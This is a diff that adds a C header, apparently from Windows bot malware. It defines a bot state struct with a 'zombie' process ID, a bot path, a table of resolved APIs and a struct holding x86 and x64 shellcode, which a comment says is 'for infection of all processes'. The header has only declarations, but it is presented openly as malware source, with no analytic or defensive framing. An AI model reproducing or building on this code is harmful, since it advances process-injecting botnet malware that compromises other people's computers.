@@ -1,0 +1,36 @@
+#pragma once
+#include "api_structs.h"
+
+typedef struct  
+{
+	LPWSTR ConfigDirectory;
+	LPWSTR ConfigPath;
+}dynamic_config_t;
+
+typedef struct  
+{
+	LPVOID lpShellcode_x86, lpShellcode_x64;
+	DWORD dwShellcode_x86_Size, dwShellcode_x64_Size;
+}malware_t;
+
+typedef struct
+{
+	apis_t api;
+	modules_t modules;
+
+	crc_t crc;
+
+	wchar_t wzBotPath[255];
+
+	HMODULE hLocal;
+	DWORD dwZombiePID;
+
+	dynamic_config_t dynamicconfig;
+
+	BOOL IsZombie;
+
+	//Struct containing shellcode for x86 and x64 DLL for infection of all processes
+	malware_t malware;
+} bot_t;
+
+#define CWA(name) bot.api.p##name
